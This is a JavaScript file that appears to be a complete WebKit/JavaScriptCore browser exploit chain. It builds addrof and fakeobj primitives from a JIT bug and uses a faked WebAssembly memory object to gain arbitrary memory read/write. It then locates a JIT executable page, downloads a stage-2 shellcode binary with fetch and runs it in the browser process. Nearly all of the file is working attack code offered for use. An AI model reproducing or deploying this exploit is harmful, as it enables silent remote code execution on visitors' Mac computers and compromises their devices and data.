// Must create this indexing type transition first,
// otherwise the JIT will deoptimize later.
var a = [13.37, 13.37];
a[0] = {};

//
// addrof primitive
//
function addrofInternal(val) {
    var array = [13.37];
    var reg = /abc/y;
    
    function getarray() {
        return array;
    }
    
    // Target function
    var AddrGetter = function(array) {
        for (var i = 2; i < array.length; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        
        array = getarray();
        reg[Symbol.match](val === null);
        return array[0];
    }
    
    // Force optimization
    for (var i = 0; i < 100000; ++i)
        AddrGetter(array);
    
    // Setup haxx
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = val;
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    return AddrGetter(array);
}

// Need to wrap addrof in this wrapper because it sometimes fails (don't know why, but this works)
function addrof(val) {
    for (var i = 0; i < 100; i++) {
        var result = addrofInternal(val);
        if (typeof result != "object" && result !== 13.37){
            return result;
        }
    }
    
    print("[-] Addrof didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
    throw "See above";
}

//
// fakeobj primitive
//
function fakeobjInternal(val) {
    var array = [13.37];
    var reg = /abc/y;
    
    function getarray() {
        return array;
    }
    
    // Target function
    var ObjFaker = function(array) {
        for (var i = 2; i < array.length; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        
        array = getarray();
        reg[Symbol.match](val === null);
        array[0] = val;
    }
    
    // Force optimization
    for (var i = 0; i < 100000; ++i)
        ObjFaker(array);
    
    // Setup haxx
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = {};
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    var unused = ObjFaker(array);
    
    return array[0];
}

// Need to wrap fakeobj in this wrapper because it sometimes fails (don't know why, but this works)
function fakeobj(val) {
    for (var i = 0; i < 1000; i++) {
        var result = fakeobjInternal(val);
        if (typeof result == "object"){
            return result;
        }
    }
    
    print("[-] Fakeobj didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
    throw "See above";
}

function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function str2ab(str) {
    var array = new Uint8Array(str.length);
    for(var i = 0; i < str.length; i++) {
        array[i] = str.charCodeAt(i);
    }
    return array.buffer
}

function pwn() {
    // Spray Float64Array structures so that structure ID 0x5000 will
    // be a Float64Array with very high probability
    // We spray Float64Array first because it's faster
    var structs = [];
    for (var i = 0; i < 0x5000; i++) {
        var a = new Float64Array(1);
        a['prop' + i] = 1337;
        structs.push(a);
    }
    // Now spray WebAssembly.Memory
    for (var i = 0; i < 50; i++) {
        var a = new WebAssembly.Memory({inital: 0});
        a['prop' + i] = 1337;
        structs.push(a);
    }
    
    var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
    var webAssemblyBuffer = str2ab(webAssemblyCode);
    var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
    
    // Setup container to host the fake Wasm Memory Object
    var jsCellHeader = new Int64([
        0x00, 0x50, 0x00, 0x00, // m_structureID
        0x0,                    // m_indexingType
        0x2c,                   // m_type
        0x08,                   // m_flags
        0x1                     // m_cellState
    ]);
    
    var wasmBuffer = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: null,
        vector: null,
        memory: null,
        deleteMe: null
    };
    
    var wasmInternalMemory = {
        jsCellHeader: null,
        memoryToRead: {}, 
        sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
        junk1: null,
        junk2: null,
        junk3: null,
        junk4: null,
        junk5: null,
    };
    
    var leaker = {
        objectToLeak: null
    };
    
    // I want 0s here ;)
    delete wasmBuffer.butterfly;
    delete wasmBuffer.vector;
    delete wasmBuffer.deleteMe;
    delete wasmInternalMemory.junk1;
    delete wasmInternalMemory.junk2;
    delete wasmInternalMemory.junk3;
    delete wasmInternalMemory.junk4;
    delete wasmInternalMemory.junk5;
    
    // We'll need this one later
    var realWasmMem = new WebAssembly.Memory({inital: 0x1});
    
    var wasmBufferRawAddr = addrof(wasmBuffer);
    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
    print("[+] Fake Wasm Memory @ " + wasmBufferAddr);
    var fakeWasmBuffer = fakeobj(wasmBufferAddr.asDouble());
    
    while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
    }
    
    //
    // BEGIN CRITICAL SECTION
    // 
    // GCing now would cause a crash...
    //
    
    var wasmMemRawAddr = addrof(wasmInternalMemory);
    var wasmMemAddr = Add(Int64.fromDouble(wasmMemRawAddr), 16);
    print("[+] Fake Wasm Internal Memory @ " + wasmMemAddr);
    var wasmMem = fakeobj(wasmMemAddr.asDouble());
    
    wasmBuffer.memory = wasmMem;
    
    var importObject = {
        imports: {
            mem: fakeWasmBuffer
        }
    };
    
    // For reading and writing 64 bit integers, we use int16 because 32 bit integers are weird in javascript (sign bit)
    function read_i64(readingFunc, offset) {
        var low = readingFunc(offset * 4);
        var midLow = readingFunc((offset * 4) + 1);
        var midHigh = readingFunc((offset * 4) + 2);
        var high = readingFunc((offset * 4) + 3);
        return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
    }
    
    function write_i64(writingFunc, offset, value) {
        writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
        writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
        writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
        writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
    }
    
    // Create writer from Object
    function createObjWriter(obj) {
        wasmInternalMemory.memoryToRead = obj;
        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
    }
    
    var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
    var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
    
    // Create writer from address
    function createDirectWriter(address) {
        wasmInternalBufferWriter.write_i64(1, address);
        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
    }
    
    // Now edit our real Wasm memory
    var realWasmWriter = createObjWriter(realWasmMem);
    var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
    print("[+] Real Wasm Internal Memory @ " + realWasmInternalMemAddr);
    wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
    
    // Create an object leaker
    var leakerWriter = createObjWriter(leaker);
    
    // Set sizes to large values
    wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
    wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
    wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
    var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
    importObject.imports.mem = realWasmMem;
    
    // Now we can replace addrof
    addrof = function(obj) {
        leaker.objectToLeak = obj;
        return leakerWriter.read_i64(2);
    }
    
    // ...and fakeobj
    fakeobj = function(addr) {
        leakerWriter.write_i64(2, addr);
        return leaker.objectToLeak;
    }
    
    // And createObjWriter
    createObjWriter = function(obj) {
        return createDirectWriter(addrof(obj));
    }
    
    //
    // Cleanup section: Cleanup the mess we created!
    //
    
    print("[+] Begining cleanup...");
    
    var writer = createObjWriter(wasmMem);
    writer.write_i64(0, Int64.One);
    var wasmBufferWriter = createObjWriter(wasmBuffer);
    var writer = createObjWriter(wasmInternalMemory);
    wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); // Don't know why this works, lol
    wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
    
    writer.write_i64(4, Int64.Zero);
    writer.write_i64(5, Int64.Zero);
    writer.write_i64(6, Int64.Zero);
    writer.write_i64(7, Int64.Zero);
    writer.write_i64(0, new Int64('0x0000000000000007'));
    writer.write_i64(2, new Int64('0x0000000000000007'));
    
    //
    // END CRITICAL SECTION
    // 
    // The Garbage Collector may now continue to run
    //
    
    print("[+] Cleanup done, the Garbage Collector may run now");
    
    var memory = {
        create_writer: function(addrObj) {
            if (addrObj instanceof Int64) {
                var writer = createDirectWriter(addrObj);
                return writer;
            } else {
                var writer = createObjWriter(addrObj);
                return writer;
            }
        },
        read_i64: function(addrObj, offset) {
            var writer = this.create_writer(addrObj);
            return writer.read_i64(offset);
        },
        write_i64: function(addrObj, offset, value) {
            var writer = this.create_writer(addrObj);
            writer.write_i64(offset, value);
        },
        read_i32: function(addrObj, offset) {
            var writer = this.create_writer(addrObj);
            return new Int64(writer.read_i32(offset));
        },
        write_i32: function(addrObj, offset, value) {
            var writer = this.create_writer(addrObj);
            writer.write_i32(offset, value);
        },
        read_i8: function(addrObj, offset) {
            var writer = this.create_writer(addrObj);
            return writer.read_i8(offset);
        },
        write_i8: function(addrObj, offset, value) {
            var writer = this.create_writer(addrObj);
            writer.write_i8(offset, value);
        },
        copyto: function(addrObj, offset, data, length) {
            var writer = this.create_writer(addrObj);
            for (var i = 0; i < length; i++) {
                writer.write_i8(offset + i, data[i]);
            }
        },
        copyfrom: function(addrObj, offset, length) {
            var writer = this.create_writer(addrObj);
            var arr = new Uint8Array(length);
            for (var i = 0; i < length; i++) {
                arr[i] = writer.read_i8(offset + i);
            }
            return arr;
        }
    }
    
    print("[+] Got stable Memory R/W");
    
    var hasPAC = function() {
        var sinFuncAddr = addrof(Math.sin);
        
        var executableAddr = memory.read_i64(sinFuncAddr, 3);
        
        var jitCodeAddr = memory.read_i64(executableAddr, 3);
        
        var rxMemAddr = memory.read_i64(jitCodeAddr, 4);
        if (ShiftRight(rxMemAddr, 4) == 0x7fff) {
            return false; // macOS Library Pointer - Shared Library cache
        } else if (ShiftRight(rxMemAddr, 5) == 0) {
            return false; // macOS/iOS Pointer - On macOS not from Shared Library cache, on iOS from Shared Library cache but without PAC
        }
        
        return true; // Must have PAC then, right?
    }();
    
    if (hasPAC) {
        print("[*] This device is using PAC -> it is an iPhone XS (max) or iPhone XR")
    }
    
    function stripPACifRequired(addr) {
        if (hasPAC) {
            return And(addr, new Int64('0xFFFFFFFF8'));
        } else {
            return addr;
        }
    }
    
    function getJITFunction(rwx, silent) {
        if (silent == undefined) {
            silent = false;
        }
        
        var printFunc = print;
        if (silent) {
            printFunc = function (str) {};
        }
        
        var shellcodeFunc = makeJITCompiledFunction();
        
        var shellcodeFuncAddr = addrof(shellcodeFunc);
        printFunc("[+] Shellcode function @ " + shellcodeFuncAddr);
        
        var executableAddr = memory.read_i64(shellcodeFuncAddr, 3);
        printFunc("[+] Executable instance @ " + executableAddr);
        
        var jitCodeAddr = memory.read_i64(executableAddr, 3);
        printFunc("[+] JITCode instance @ " + jitCodeAddr);
        
        var rwxMemAddr = memory.read_i64(jitCodeAddr, 4);
        rwxMemAddr = stripPACifRequired(rwxMemAddr);
        printFunc("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
        
        return [shellcodeFunc, rwxMemAddr];
    }
    
    function detectOS() {
        var funcAddr = getJITFunction(false, true);
        var memAddr = funcAddr[1];
        
        print("[*] Checking device OS");
        
        var data = memory.copyfrom(memAddr, 0, 80);
        
        // Use the function prologue to detect which device we're running on
        function checkSignature(signature, startIndex) {
            if (startIndex === undefined) {
                startIndex = 0;
            }
            
            for (var i = startIndex; i < signature.length + startIndex; i++) {
                if (data[i] != signature.charCodeAt(i - startIndex)) {
                    return false;
                }
            }
            
            return true;
        }
        
        if (checkSignature("\x55\x48\x89\xE5")) { // x86_64: push rbp; mov rbp, rsp
            print("[+] Detected macOS");
            return "macOS";
        } else {
            print("[+] Detected iOS");
            return "iOS";
        }
    }
    
    function fetchAndExec(file, rwx, func) {
        print("[*] Downloading stage 2...");
        fetch(file).then(function (response) {
            if (!response.ok) {
                print("[!] Failed to download stage 2!");
                throw "Failed to download stage 2!";
            }
            return response.arrayBuffer();
        }).then(function (buffer) {
            print("[+] Downloaded");
            var funcAddr = getJITFunction(rwx);
            func(new Uint8Array(buffer), funcAddr[0], funcAddr[1]);
            print("[!] Launching stage 2");
        
            // We want to print stuff. Therefore, the shellcode patches itself and then regulary returns to print characters. Yes, this is a creative hack.
            var result = 0;
            while (true) {
                var value = funcAddr[0]();
                if (value < 1) {
                    result = value;
                    break;
                }
                
                putchar(String.fromCharCode(value));
            }
            
            print("[+] Stage 2 result: " + result.toString());
            print("[+] I'm done here, continuing WebContent like nothing happened ;)");
            ws_log.send("Connection closed!");
            ws_log.close();
        }).catch(function (e) {
            print("[-] Exception caught: " + e);
            ws_log.send("Connection closed!");
            ws_log.close();
        });
    }
    
    if (detectOS() === "macOS") {
        fetchAndExec("/stage2/stage2_macOS.bin", true, function (buffer, shellcodeFunc, rwxMemAddr) {
            print("[+] Copying shellcode to memory...");
            memory.copyto(rwxMemAddr, 0, buffer, buffer.byteLength);
        });
    } else {
        // Obviously iOS - use hasPAC to find out wether it is an iPhone XS (max) / iPhone XR or not
        throw "iOS is not supported yet!";
    }
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
        ws_log.send("Connection closed!");
        ws_log.close();
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});